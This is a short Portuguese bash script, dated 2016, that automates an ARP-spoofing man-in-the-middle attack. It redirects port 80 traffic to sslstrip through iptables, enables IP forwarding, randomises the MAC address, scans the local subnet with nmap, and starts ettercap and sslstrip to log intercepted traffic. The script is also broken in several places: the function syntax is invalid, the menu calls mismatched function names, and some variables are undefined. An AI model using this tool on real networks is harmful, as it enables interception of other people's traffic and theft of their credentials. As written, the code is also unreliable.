# 
# Script de ARP-Spoof utilizando sslstrip e ettercap
# 
# Data: 2016/05/04
# Autor: Joao Lucas
#

menu {
        clear
        echo "1. Listar placas de rede"
        echo "2. Ver regras do iptables"
        echo "3. Limpar regras do iptables"
        echo "4. Iniciar regras"
        echo "5. Mudar macaddress" 
        echo "6. Identificas hosts"
        echo "7. Iniciar Snnifer"
        echo "99. Sair"
        read -p "> Escolha: " opt

        case $opt in
                1) listarPlacasdeRede ;;
                2) verRegrasdoIptables ;;
                3) limparRegrasIptables ;;
                4) iniciarRegras ;;
                5) mudarMacAddress ;;
                6) identificarHosts ;;
                7) iniciarSnnifer ;;
                8) echo "Saindo..."; sleep 3; exit ;;
                *) echo "Opção Invalida!" ; menu ;;
        esac
}      

listarPlacasdeRede {
        ifconfig -a | less 
        menu
}

verRegrasdoIptables {
        iptables -t nat -L | less
        menu
        
}
limparRegrasdoIptables{
        iptables -t nat -F | less
        menu
}
 
mudarMacAddress{
        macchanger -r wlp2s0
        sleep 3
        menu
}

iniciarRegras {
        # criando regras no iptables
        echo "~> Criando regras no iptables..."
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000        
        if [ $? -eq 0 ]
        then
                echo "[ OK ] Regras no iptables criada." 
                echo "~> Ativando ip_forward..." 
                echo 1 > /proc/sys/net/ipv4/ip_forward
                if [ $? -eq 0 ]
                then
                        echo "[ OK ] Ip_forward ativado."
                        sleep 2
                else
                        echo "[ FALHA ] Ocorreu erros em ativar o ip_forward! " 
                        sleep 2
                fi                  
        else
               echo "[ FALHA ] Ocorreu erros em criar regras!"
       fi
        
       menu  
}

identificarHosts{
        nmap -Pn -T 3 192.168.1.0/24 | tee hosts.txt && egrep '([0-9]{1,3}\.){3}[0-9]{1,3}' hosts.txt | awk '{print $5}' | less
        menu
}

iniciarSniffer {
        # salvando em ...
        ettercap -G &
 
        killall -TERM sslstripe
        xfce4-terminal -e sslstrip -w $PREFIX/cap$DATA.log
        tail -f $PREFIX/$ARQUIVO | tee mitm_output.txt
}
